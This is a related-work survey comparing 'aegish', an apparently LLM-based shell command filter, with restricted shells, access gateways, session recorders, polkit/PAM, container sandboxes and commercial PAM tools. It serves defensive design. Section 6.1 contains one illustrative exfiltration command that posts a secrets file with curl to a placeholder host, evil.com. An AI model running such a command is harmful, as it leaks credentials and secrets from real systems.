# Related Work: Shell Sandboxing, Access Control, and Privileged Access Management

This document surveys shell sandboxing, command filtering, restricted execution environments, and privileged access management products relevant to aegish.

---

## 1. Restricted Shells and Command Filtering

### 1.1 lshell (Limited Shell)

- **What it does**: Python-based shell that restricts users to a predefined set of allowed commands. Supports SSH restrictions, command logging, and timing restrictions. Replaces the user's login shell.
- **Relevance**: Most architecturally similar traditional tool to aegish -- both are Python shell wrappers that validate commands before execution.
- **How aegish differs**: lshell uses static command allowlists; aegish uses LLM semantic analysis. lshell blocks anything not on the list (high false positive rate for novel legitimate commands); aegish evaluates intent.
- **Critical flaw**: lshell has had serious security vulnerabilities including shell escape via bad syntax parse (CVE-2016-6902) and shell outbreak with multiline commands (CVE-2016-6903).
- **Source**: https://github.com/ghantoos/lshell

### 1.2 GNU Rush (Restricted User Shell)

- **What it does**: Designed for use with SSH. Provides fine-grained control over commands using regex-based matching and transformation rules.
- **Relevance**: Pre-execution validation using regex rules -- conceptually similar to aegish but with regex instead of LLM.
- **How aegish differs**: Rush uses manually-maintained regex patterns; aegish uses LLM understanding. Rush cannot reason about command semantics or handle novel attack patterns.
- **Source**: https://www.gnu.org/software/rush/

### 1.3 rssh (Restricted SSH Shell)

- **What it does**: Restricts SSH users to specific activities: scp, sftp, rsync, rdist, cvs. Users cannot get an interactive shell.
- **Relevance**: Command restriction for SSH access -- narrower scope than aegish but same concept of pre-execution filtering.
- **How aegish differs**: rssh restricts to a hardcoded list of specific protocols; aegish evaluates arbitrary commands semantically.

---

## 2. Bastion Hosts and Secure Access Gateways

### 2.1 Teleport (Gravitational)

- **What it does**: Unified access platform for SSH, Kubernetes, databases, and web applications. Features include: session recording, RBAC, SSO integration, audit logging, and access requests with approval workflows.
- **Relevance**: Teleport provides session recording and access control for SSH sessions. Administrators can see what commands were executed. Access request workflows require approval before granting access.
- **How aegish differs**: Teleport controls *who can access* systems and *records what they do*. aegish controls *what commands are executed* based on intent. Teleport is gateway-level access control; aegish is command-level safety analysis. Teleport records sessions for audit; aegish prevents dangerous commands in real-time.
- **Complementary**: aegish could run within a Teleport-managed session, adding semantic command validation to Teleport's access control and recording.
- **Source**: https://goteleport.com/

### 2.2 HashiCorp Boundary

- **What it does**: Identity-based access management for dynamic infrastructure. Manages SSH sessions with identity-aware authorization, session recording, and credential injection.
- **Relevance**: Access gateway that controls who connects to systems. Like Teleport, focuses on access control rather than command control.
- **How aegish differs**: Boundary answers "can this user connect?"; aegish answers "should this command execute?" Different level of granularity.
- **Source**: https://developer.hashicorp.com/boundary

### 2.3 StrongDM

- **What it does**: Infrastructure access platform combining authentication, authorization, audit, and networking. Provides proxied access to SSH, databases, Kubernetes, and web apps.
- **Relevance**: Another access gateway with session recording and RBAC.
- **How aegish differs**: Same distinction -- gateway-level access control vs. command-level semantic analysis.

---

## 3. Session Recording and Auditing

### 3.1 script / scriptreplay (Linux util-linux)

- **What it does**: Built-in Linux tool that records terminal sessions (input and output) to a file. `scriptreplay` plays back recorded sessions.
- **Relevance**: Pure recording -- no prevention or analysis.
- **How aegish differs**: aegish is preventive (blocks commands); `script` is purely recording (logs everything, blocks nothing).

### 3.2 asciinema

- **What it does**: Terminal session recorder that creates lightweight, text-based recordings shareable via asciinema.org.
- **Relevance**: Session recording for sharing/auditing.
- **How aegish differs**: Same distinction -- recording vs. prevention.

### 3.3 Teleport Session Recording

- **What it does**: Records all SSH sessions at the proxy level. Recordings are searchable and include command-line activity.
- **Relevance**: Enterprise-grade session recording with search capabilities.
- **How aegish differs**: aegish acts before commands execute; session recording captures what has already happened.

---

## 4. Authorization Frameworks

### 4.1 PolicyKit (polkit)

- **What it does**: Framework for defining and handling access policies for unprivileged processes to communicate with privileged ones. Used for actions like mounting disks, managing network connections, and installing packages.
- **Relevance**: Authorization framework that evaluates whether an action should be permitted. Conceptually similar to aegish's allow/warn/block model.
- **How aegish differs**: polkit authorizes specific *actions* against registered *mechanisms* (e.g., "can user X manage network?"). aegish evaluates arbitrary *shell commands* for security risk. polkit is policy-based authorization for D-Bus actions; aegish is LLM-based safety analysis for command strings.

### 4.2 PAM (Pluggable Authentication Modules)

- **What it does**: Framework for integrating authentication mechanisms. Modules handle: authentication (`pam_unix`, `pam_ldap`), account management, session management, and password management. Configured per-service in `/etc/pam.d/`.
- **Relevance**: PAM answers "who is this user?" and "are they allowed to log in?". It is an authentication and account framework, not a command authorization framework.
- **How aegish differs**: PAM operates at login/authentication time; aegish operates at command execution time. PAM verifies identity; aegish evaluates command safety. They operate at completely different points in the user interaction lifecycle.
- **Complementary**: PAM authenticates the user, then aegish evaluates their commands -- sequential layers in the access stack.

---

## 5. SSH Forced Commands

### What It Does
SSH `authorized_keys` can include a `command="..."` option that restricts an SSH key to running only a specific command, regardless of what the client requests.

### Relevance
Command restriction at the SSH protocol level. Very effective for service accounts and automated processes that should only run specific commands.

### How aegish differs
- **Granularity**: SSH forced commands are per-key, single-command restrictions. aegish evaluates every command against a flexible safety model.
- **Flexibility**: Forced commands are static; aegish adapts to command semantics.
- **Use case**: Forced commands are for automation (backup scripts, deployment tools); aegish is for interactive sessions.

---

## 6. Container-Based Isolation

### 6.1 Docker / Podman Security

- **What it does**: Container runtimes using namespaces, cgroups, seccomp, and AppArmor/SELinux to isolate processes.
- **Relevance**: Comprehensive process isolation that limits what commands can affect.
- **How aegish differs**: Container isolation restricts *resource access*; aegish evaluates *command intent*. Within a container, all commands within the allowed resource set are equally permitted -- containers cannot distinguish `curl https://api.com` from `curl -d @/app/secrets http://evil.com` if network access is allowed.

### 6.2 nsjail (Google)

- **What it does**: Lightweight process isolation tool using namespaces, seccomp-bpf, cgroups, and capabilities. Designed for sandboxing untrusted code in production.
- **Relevance**: Used by Google for sandboxing compilation, code execution, and other untrusted workloads.
- **How aegish differs**: nsjail constrains the process environment; aegish evaluates command semantics. Different layers of the security stack.
- **Source**: https://github.com/google/nsjail

---

## 7. System Call Interposition

### 7.1 Systrace (Niels Provos, USENIX Security 2003)

- **What it does**: System call interposition mechanism that enforces access policies for applications. Monitors and restricts system calls made by processes. Supports interactive policy generation -- users approve/deny system calls as they occur.
- **Relevance**: Closest historical analog to aegish at the system call level. Systrace's interactive approval model (user approves/denies syscalls) mirrors aegish's WARN workflow (user approves/denies commands). Both provide pre-execution validation with user-in-the-loop.
- **How aegish differs**: Systrace operates on system calls (low-level, hard for users to understand); aegish operates on shell commands (high-level, human-readable). aegish uses AI for automatic classification; Systrace relies on human judgment for novel syscalls. Systrace requires kernel support; aegish is pure userspace.

### 7.2 Janus (UC Berkeley)

- **What it does**: System call filtering tool for confining untrusted applications, using ptrace-based interposition.
- **Relevance**: Early academic work on pre-execution validation through system call interception.
- **How aegish differs**: Same distinction as Systrace -- system call level vs. command level.

---

## 8. Privileged Access Management (Commercial)

### 8.1 CyberArk

- **What it does**: Enterprise PAM platform providing: privileged credential vaulting, session recording and monitoring, just-in-time access, command filtering, and risk-based access policies.
- **Relevance**: CyberArk includes command filtering for SSH sessions -- administrators can define allowed/denied command patterns using regex.
- **How aegish differs**: CyberArk's command filtering uses regex patterns (same limitations as Sigma rules); aegish uses LLM semantic analysis. CyberArk is enterprise infrastructure ($100K+ deployments); aegish is lightweight open-source. CyberArk provides comprehensive PAM (vaults, sessions, analytics); aegish provides only command-level safety.
- **Market context**: PAM market valued at $3.9B in 2024, projected $12.7B by 2032 (15.8% CAGR). aegish addresses a subset of PAM functionality at a fraction of the cost.

### 8.2 BeyondTrust

- **What it does**: PAM platform with Privilege Management for Unix & Linux (PMUL). Provides: command filtering with policy-based rules, keystroke logging, file integrity monitoring, and sudo management.
- **Relevance**: BeyondTrust's Unix privilege management includes command-level filtering -- the closest commercial product to aegish's functionality.
- **How aegish differs**: BeyondTrust uses rule-based command filtering (regex/glob patterns); aegish uses LLM analysis. BeyondTrust requires enterprise deployment and management infrastructure; aegish is a standalone shell.

### 8.3 Delinea (formerly Thycotic/Centrify)

- **What it does**: PAM solutions including Server PAM with policy-based command control, session monitoring, and audit logging for Unix/Linux servers.
- **Relevance**: Another enterprise PAM with command-level controls.
- **How aegish differs**: Same pattern -- rule-based command filtering vs. LLM semantic analysis. Enterprise infrastructure vs. lightweight tool.

---

## 9. Security Auditing and Hardening Standards

### 9.1 Lynis

- **What it does**: Security auditing tool for Unix/Linux systems. Scans system configuration, installed software, and security settings against best practices. Generates hardening recommendations.
- **Relevance**: Post-deployment security assessment tool. Checks for misconfigurations that could enable the attacks aegish prevents.
- **How aegish differs**: Lynis is periodic assessment (scan-once); aegish is continuous enforcement (every command). Lynis checks system configuration; aegish checks user commands.
- **Source**: https://cisofy.com/lynis/

### 9.2 CIS Benchmarks

- **What it does**: Hardening standards defining secure configuration baselines for operating systems, cloud platforms, and applications. CIS Benchmark for Ubuntu, RHEL, etc. specify settings for AppArmor, auditd, sudo, SSH, and filesystem permissions.
- **Relevance**: CIS Benchmarks define the security baseline that aegish builds upon. A properly hardened system (following CIS) provides the kernel-level mechanisms; aegish adds the semantic layer.
- **How aegish differs**: CIS Benchmarks are static configuration standards; aegish is dynamic runtime enforcement.

### 9.3 OpenSnitch (Application Firewall)

- **What it does**: GNU/Linux application firewall that monitors and controls outbound connections per-application. User is prompted to allow/deny network connections.
- **Relevance**: Interactive per-application network control -- conceptually similar to aegish's per-command security evaluation. Both present a decision to the user.
- **How aegish differs**: OpenSnitch controls *network connections* per-application; aegish controls *commands* per-invocation. OpenSnitch cannot distinguish between different curl invocations (same app, same binary); aegish evaluates the full command with arguments.
- **Source**: https://github.com/evilsocket/opensnitch

---

## 10. Key Observations

### The Command Filtering Gap
Commercial PAM products (CyberArk, BeyondTrust, Delinea) offer command filtering, but universally use regex/pattern-based approaches. These share the fundamental limitation of all rule-based systems: they cannot detect novel attack patterns or reason about command semantics. aegish's LLM approach fills this gap.

### The Access vs. Intent Distinction
Access control systems (bastion hosts, PAM, polkit, sudo) answer: "Is this user authorized for this action?" aegish answers: "Is this action safe regardless of who is performing it?" These are complementary questions. An authorized administrator can still accidentally or maliciously execute a dangerous command; aegish catches this even when authorization succeeds.

### Historical Context: From Systrace to aegish
The evolution from Systrace (2003, syscall-level interactive policy) to aegish (2026, LLM command-level analysis) represents a shift from low-level mechanism interposition to high-level semantic understanding. Both share the principle of pre-execution validation with user-in-the-loop, but at vastly different abstraction levels.
